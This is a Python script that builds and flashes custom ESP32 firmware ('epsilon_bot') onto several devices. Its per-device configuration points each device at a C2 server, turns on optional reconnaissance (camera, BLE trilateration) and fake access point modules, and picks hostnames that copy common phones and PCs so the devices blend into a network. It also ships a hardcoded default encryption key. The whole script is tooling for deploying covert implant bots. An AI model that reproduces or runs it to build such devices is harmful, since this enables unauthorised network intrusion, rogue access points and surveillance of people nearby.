#!/usr/bin/env python3
"""
Epsilon Multi-Device Flasher
Automates building and flashing ESP32 devices with custom configurations.
"""

import os
import json
import subprocess
import string
import random
import argparse
from typing import List, Optional
from dataclasses import dataclass


# Configuration
CONFIG_FILE = "devices.json"
SDKCONFIG_FILENAME = "sdkconfig.defaults"


@dataclass
class Device:
    """Represents an ESP32 device configuration"""
    device_id: str
    port: str
    srv_ip: str
    srv_port: int = 2626

    # Network configuration
    network_mode: str = "wifi"  # "wifi" or "gprs"
    wifi_ssid: Optional[str] = None
    wifi_pass: Optional[str] = None
    gprs_apn: Optional[str] = "sl2sfr"

    # Optional settings
    hostname: Optional[str] = None

    # Modules
    module_network: bool = True
    module_recon: bool = False
    module_fakeap: bool = False

    # Recon settings
    recon_camera: bool = False
    recon_ble_trilat: bool = False

    # Security
    crypto_key: str = "testde32chars00000000000000000000"
    crypto_nonce: str = "noncenonceno"

    def __post_init__(self):
        """Generate hostname if not provided"""
        if not self.hostname:
            self.hostname = self._generate_hostname()

        # Validate network mode
        if self.network_mode not in ["wifi", "gprs"]:
            raise ValueError(f"Invalid network_mode: {self.network_mode}. Must be 'wifi' or 'gprs'")

        # Validate WiFi mode has credentials
        if self.network_mode == "wifi" and (not self.wifi_ssid or not self.wifi_pass):
            raise ValueError("WiFi mode requires wifi_ssid and wifi_pass")

    @staticmethod
    def _generate_hostname() -> str:
        """Generate a realistic device hostname"""
        hostnames = [
            "iPhone",
            "Android",
            f"DESKTOP-{''.join([random.choice(string.digits + string.ascii_uppercase) for _ in range(7)])}",

            # iPhones
            "iPhone-15-pro-max", "iPhone-15-pro", "iPhone-15", "iPhone-15-plus",
            "iPhone-14-pro-max", "iPhone-14-pro", "iPhone-14", "iPhone-14-plus",
            "iPhone-se-3rd-gen", "iPhone-13-pro-max",

            # Samsung
            "galaxy-s24-ultra", "galaxy-s24", "galaxy-z-fold5", "galaxy-z-flip5", "galaxy-a55",

            # Xiaomi
            "xiaomi-14-ultra", "xiaomi-14", "redmi-note-13-pro-plus", "redmi-note-13-5g", "poco-f6-pro",

            # OnePlus
            "oneplus-12", "oneplus-12r", "oneplus-11", "oneplus-nord-3", "oneplus-nord-ce-3-lite",

            # Google
            "pixel-8-pro", "pixel-8", "pixel-7a", "pixel-fold", "pixel-6a",

            # Motorola
            "moto-edge-50-ultra", "moto-g-stylus-5g-2024", "moto-g-power-2024",
            "razr-50-ultra", "moto-e32",

            # Sony
            "xperia-1-vi", "xperia-10-vi", "xperia-5-v", "xperia-l5", "xperia-pro-i",

            # Oppo
            "oppo-find-x6-pro", "oppo-reno9-pro", "oppo-a78", "oppo-f21-pro", "oppo-a17",

            # Vivo
            "vivo-x90-pro-plus", "vivo-x90-pro", "vivo-y35", "vivo-y75", "vivo-v29e",

            # Realme
            "realme-11-pro-plus", "realme-10x", "realme-9i", "realme-c33", "realme-11x",

            # Asus
            "rog-phone-8-pro", "zenfone-10", "rog-phone-7", "rog-phone-6d", "asus-zenfone-9",

            # Lenovo
            "lenovo-legion-y90", "lenovo-k14-note", "lenovo-k14-plus", "lenovo-tab-m10",

            # Honor
            "honor-90", "honor-x8a", "honor-70-pro", "honor-magic5-pro", "honor-x7a",

            # Huawei
            "huawei-p60-pro", "huawei-p50-pro", "huawei-mate-50-pro", "huawei-mate-xs-2", "huawei-nova-11",

            # LG
            "lg-wing", "lg-velvet", "lg-g8x-thinQ", "lg-v60-thinQ", "lg-k92-5g"
        ]
        return random.choice(hostnames)

    @classmethod
    def from_dict(cls, data: dict):
        """Create Device from dictionary"""
        return cls(
            device_id=data["device_id"],
            port=data["port"],
            srv_ip=data["srv_ip"],
            srv_port=data.get("srv_port", 2626),
            network_mode=data.get("network_mode", "wifi"),
            wifi_ssid=data.get("wifi_ssid"),
            wifi_pass=data.get("wifi_pass"),
            gprs_apn=data.get("gprs_apn", "sl2sfr"),
            hostname=data.get("hostname"),
            module_network=data.get("module_network", True),
            module_recon=data.get("module_recon", False),
            module_fakeap=data.get("module_fakeap", False),
            recon_camera=data.get("recon_camera", False),
            recon_ble_trilat=data.get("recon_ble_trilat", False),
            crypto_key=data.get("crypto_key", "testde32chars00000000000000000000"),
            crypto_nonce=data.get("crypto_nonce", "noncenonceno")
        )

    def __str__(self):
        return f"{self.device_id} ({self.network_mode.upper()}) on {self.port}"


class FirmwareBuilder:
    """Handles firmware building for ESP32 devices"""

    def __init__(self, project_path: str):
        self.project_path = project_path
        self.sdkconfig_path = os.path.join(self.project_path, SDKCONFIG_FILENAME)
        self.build_dir = os.path.join(self.project_path, "build")
        self.firmware_dir = os.path.join(self.project_path, "firmware")
        os.makedirs(self.firmware_dir, exist_ok=True)

    def generate_sdkconfig(self, device: Device):
        """Generate sdkconfig.defaults for a specific device"""

        # Backup existing config
        if os.path.exists(self.sdkconfig_path):
            backup_path = f"{self.sdkconfig_path}.bak"
            with open(self.sdkconfig_path, "r") as src, open(backup_path, "w") as dst:
                dst.write(src.read())

        # Generate new config
        config_lines = []

        # Device ID
        config_lines.append(f'CONFIG_DEVICE_ID="{device.device_id}"')

        # Network Mode
        if device.network_mode == "wifi":
            config_lines.append("CONFIG_NETWORK_WIFI=y")
            config_lines.append("CONFIG_NETWORK_GPRS=n")
            config_lines.append(f'CONFIG_WIFI_SSID="{device.wifi_ssid}"')
            config_lines.append(f'CONFIG_WIFI_PASS="{device.wifi_pass}"')
        else:  # gprs
            config_lines.append("CONFIG_NETWORK_WIFI=n")
            config_lines.append("CONFIG_NETWORK_GPRS=y")
            config_lines.append(f'CONFIG_GPRS_APN="{device.gprs_apn}"')

        # Server
        config_lines.append(f'CONFIG_SERVER_IP="{device.srv_ip}"')
        config_lines.append(f'CONFIG_SERVER_PORT={device.srv_port}')

        # Security
        config_lines.append(f'CONFIG_CRYPTO_KEY="{device.crypto_key}"')
        config_lines.append(f'CONFIG_CRYPTO_NONCE="{device.crypto_nonce}"')

        # Modules
        config_lines.append(f'CONFIG_MODULE_NETWORK={"y" if device.module_network else "n"}')
        config_lines.append(f'CONFIG_MODULE_RECON={"y" if device.module_recon else "n"}')
        config_lines.append(f'CONFIG_MODULE_FAKEAP={"y" if device.module_fakeap else "n"}')

        # Recon settings (only if module enabled)
        if device.module_recon:
            config_lines.append(f'CONFIG_RECON_MODE_CAMERA={"y" if device.recon_camera else "n"}')
            config_lines.append(f'CONFIG_RECON_MODE_BLE_TRILAT={"y" if device.recon_ble_trilat else "n"}')

        # System settings
        config_lines.append("CONFIG_MBEDTLS_CHACHA20_C=y")
        config_lines.append("CONFIG_LWIP_IPV4_NAPT=y")
        config_lines.append("CONFIG_LWIP_IPV4_NAPT_PORTMAP=y")
        config_lines.append("CONFIG_LWIP_IP_FORWARD=y")
        config_lines.append(f'CONFIG_LWIP_LOCAL_HOSTNAME="{device.hostname}"')

        # Bluetooth (for BLE trilateration)
        if device.recon_ble_trilat:
            config_lines.append("CONFIG_BT_ENABLED=y")
            config_lines.append("CONFIG_BT_BLUEDROID_ENABLED=y")
            config_lines.append("CONFIG_BT_BLE_ENABLED=y")

        # Write config
        with open(self.sdkconfig_path, "w") as f:
            f.write("\n".join(config_lines) + "\n")

        print(f"✅ Generated sdkconfig.defaults for {device.device_id}")

    def build(self, device: Device) -> Optional[str]:
        """Build firmware for a specific device"""
        print(f"\n{'='*60}")
        print(f"🔧 Building firmware for: {device}")
        print(f"{'='*60}")

        # Generate config
        self.generate_sdkconfig(device)

        # Remove old sdkconfig to force reconfiguration
        sdkconfig = os.path.join(self.project_path, "sdkconfig")
        if os.path.exists(sdkconfig):
            os.remove(sdkconfig)
            print("🗑️  Removed old sdkconfig")

        # Build
        try:
            print("⚙️  Running idf.py build...")
            result = subprocess.run(
                ["bash", "-c", f". $HOME/esp-idf/export.sh > /dev/null 2>&1 && idf.py -C {self.project_path} -D SDKCONFIG_DEFAULTS={SDKCONFIG_FILENAME} build 2>&1"],
                capture_output=True,
                text=True,
                timeout=300  # 5 minutes timeout
            )

            if result.returncode != 0:
                print(f"❌ Build failed for {device.device_id}")
                print("Error output:")
                print(result.stdout[-2000:] if len(result.stdout) > 2000 else result.stdout)
                return None

        except subprocess.TimeoutExpired:
            print(f"❌ Build timeout for {device.device_id}")
            return None
        except Exception as e:
            print(f"❌ Build error for {device.device_id}: {e}")
            return None

        # Find binary
        bin_name = "epsilon_bot.bin"
        bin_path = os.path.join(self.build_dir, bin_name)

        if not os.path.exists(bin_path):
            print(f"❌ Binary not found: {bin_path}")
            return None

        # Copy to firmware directory with device ID
        output_bin = os.path.join(self.firmware_dir, f"{device.device_id}.bin")
        subprocess.run(["cp", bin_path, output_bin], check=True)

        print(f"✅ Firmware saved: {output_bin}")
        return output_bin


class Flasher:
    """Handles flashing ESP32 devices"""

    def __init__(self, project_path: str):
        self.project_path = project_path
        self.build_dir = os.path.join(project_path, "build")

    def flash(self, device: Device, bin_path: str):
        """Flash a device with compiled firmware"""
        print(f"\n{'='*60}")
        print(f"🚀 Flashing: {device}")
        print(f"{'='*60}")

        # Locate required files
        bootloader = os.path.join(self.build_dir, "bootloader", "bootloader.bin")
        partitions = os.path.join(self.build_dir, "partition_table", "partition-table.bin")

        # Check all files exist
        if not os.path.exists(bootloader):
            print(f"❌ Missing bootloader: {bootloader}")
            return False

        if not os.path.exists(partitions):
            print(f"❌ Missing partition table: {partitions}")
            return False

        if not os.path.exists(bin_path):
            print(f"❌ Missing application binary: {bin_path}")
            return False

        print(f"📁 Bootloader: {bootloader}")
        print(f"📁 Partitions: {partitions}")
        print(f"📁 Application: {bin_path}")
        print(f"🔌 Port: {device.port}")

        # Flash
        try:
            subprocess.run([
                "esptool.py",
                "--chip", "esp32",
                "--port", device.port,
                "--baud", "460800",
                "write_flash", "-z",
                "0x1000", bootloader,
                "0x8000", partitions,
                "0x10000", bin_path
            ], check=True)

            print(f"✅ Successfully flashed {device.device_id}")
            return True

        except subprocess.CalledProcessError as e:
            print(f"❌ Flash failed for {device.device_id}: {e}")
            return False
        except Exception as e:
            print(f"❌ Unexpected error flashing {device.device_id}: {e}")
            return False


def load_devices_from_config(config_path: str) -> tuple[str, List[Device]]:
    """Load devices from JSON config file"""
    if not os.path.exists(config_path):
        raise FileNotFoundError(f"Config file not found: {config_path}")

    with open(config_path, "r") as f:
        data = json.load(f)

    project_path = data.get("project")
    if not project_path:
        raise ValueError("Missing 'project' field in config")

    devices_data = data.get("devices", [])
    devices = [Device.from_dict(d) for d in devices_data]

    return project_path, devices


def main():
    parser = argparse.ArgumentParser(
        description="Epsilon ESP32 Multi-Device Flasher",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Flash all devices from config file
  python flash.py --config devices.json

  # Flash a single device manually (WiFi)
  python flash.py --manual \\
    --project /home/user/epsilon/espilon_bot \\
    --device-id abc12345 \\
    --port /dev/ttyUSB0 \\
    --srv-ip 192.168.1.100 \\
    --wifi-ssid MyWiFi \\
    --wifi-pass MyPassword

  # Flash a single device manually (GPRS)
  python flash.py --manual \\
    --project /home/user/epsilon/espilon_bot \\
    --device-id def67890 \\
    --port /dev/ttyUSB1 \\
    --srv-ip 203.0.113.10 \\
    --network-mode gprs \\
    --gprs-apn sl2sfr

  # Build only (no flash)
  python flash.py --config devices.json --build-only
        """
    )

    # Mode selection
    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument("--config", type=str, help="Path to devices.json config file")
    mode_group.add_argument("--manual", action="store_true", help="Manual device configuration")

    # Manual device configuration
    parser.add_argument("--project", type=str, help="Path to epsilon_bot project directory")
    parser.add_argument("--device-id", type=str, help="Device ID (8 hex chars)")
    parser.add_argument("--port", type=str, help="Serial port (e.g., /dev/ttyUSB0)")
    parser.add_argument("--srv-ip", type=str, help="C2 server IP address")
    parser.add_argument("--srv-port", type=int, default=2626, help="C2 server port (default: 2626)")

    # Network configuration
    parser.add_argument("--network-mode", choices=["wifi", "gprs"], default="wifi", help="Network mode")
    parser.add_argument("--wifi-ssid", type=str, help="WiFi SSID (required for WiFi mode)")
    parser.add_argument("--wifi-pass", type=str, help="WiFi password (required for WiFi mode)")
    parser.add_argument("--gprs-apn", type=str, default="sl2sfr", help="GPRS APN (default: sl2sfr)")

    # Optional settings
    parser.add_argument("--hostname", type=str, help="Device hostname (random if not specified)")
    parser.add_argument("--crypto-key", type=str, default="testde32chars00000000000000000000",
                        help="ChaCha20 key (32 chars)")
    parser.add_argument("--crypto-nonce", type=str, default="noncenonceno",
                        help="ChaCha20 nonce (12 chars)")

    # Modules
    parser.add_argument("--enable-recon", action="store_true", help="Enable recon module")
    parser.add_argument("--enable-fakeap", action="store_true", help="Enable fake AP module")
    parser.add_argument("--enable-camera", action="store_true", help="Enable camera reconnaissance")
    parser.add_argument("--enable-ble-trilat", action="store_true", help="Enable BLE trilateration")

    # Actions
    parser.add_argument("--build-only", action="store_true", help="Build firmware without flashing")
    parser.add_argument("--flash-only", action="store_true", help="Flash existing firmware without rebuilding")

    args = parser.parse_args()

    # Load devices
    if args.config:
        # Load from config file
        project_path, devices = load_devices_from_config(args.config)
        print(f"📋 Loaded {len(devices)} device(s) from {args.config}")
        print(f"📂 Project: {project_path}")

    else:
        # Manual device
        required = ["project", "device_id", "port", "srv_ip"]
        missing = [f for f in required if not getattr(args, f.replace("-", "_"))]
        if missing:
            parser.error(f"--manual mode requires: {', '.join(f'--{f}' for f in missing)}")

        # Validate WiFi requirements
        if args.network_mode == "wifi" and (not args.wifi_ssid or not args.wifi_pass):
            parser.error("WiFi mode requires --wifi-ssid and --wifi-pass")

        project_path = args.project
        device = Device(
            device_id=args.device_id,
            port=args.port,
            srv_ip=args.srv_ip,
            srv_port=args.srv_port,
            network_mode=args.network_mode,
            wifi_ssid=args.wifi_ssid,
            wifi_pass=args.wifi_pass,
            gprs_apn=args.gprs_apn,
            hostname=args.hostname,
            module_network=True,
            module_recon=args.enable_recon,
            module_fakeap=args.enable_fakeap,
            recon_camera=args.enable_camera,
            recon_ble_trilat=args.enable_ble_trilat,
            crypto_key=args.crypto_key,
            crypto_nonce=args.crypto_nonce
        )
        devices = [device]
        print(f"📋 Manual device configuration: {device}")

    # Validate project path
    if not os.path.exists(project_path):
        print(f"❌ Project path not found: {project_path}")
        return 1

    # Initialize tools
    builder = FirmwareBuilder(project_path)
    flasher = Flasher(project_path)

    # Process each device
    success_count = 0
    fail_count = 0

    for i, device in enumerate(devices, 1):
        print(f"\n{'#'*60}")
        print(f"# Device {i}/{len(devices)}: {device.device_id}")
        print(f"{'#'*60}")

        try:
            # Build
            if not args.flash_only:
                bin_path = builder.build(device)
                if not bin_path:
                    print(f"⚠️  Skipping flash for {device.device_id} (build failed)")
                    fail_count += 1
                    continue
            else:
                # Use existing binary
                bin_path = os.path.join(builder.firmware_dir, f"{device.device_id}.bin")
                if not os.path.exists(bin_path):
                    print(f"❌ Firmware not found: {bin_path}")
                    fail_count += 1
                    continue

            # Flash
            if not args.build_only:
                if flasher.flash(device, bin_path):
                    success_count += 1
                else:
                    fail_count += 1
            else:
                print(f"ℹ️  Build-only mode, skipping flash")
                success_count += 1

        except Exception as e:
            print(f"❌ Error processing {device.device_id}: {e}")
            fail_count += 1

    # Summary
    print(f"\n{'='*60}")
    print(f"📊 SUMMARY")
    print(f"{'='*60}")
    print(f"✅ Success: {success_count}/{len(devices)}")
    print(f"❌ Failed:  {fail_count}/{len(devices)}")
    print(f"{'='*60}\n")

    return 0 if fail_count == 0 else 1


if __name__ == "__main__":
    exit(main())
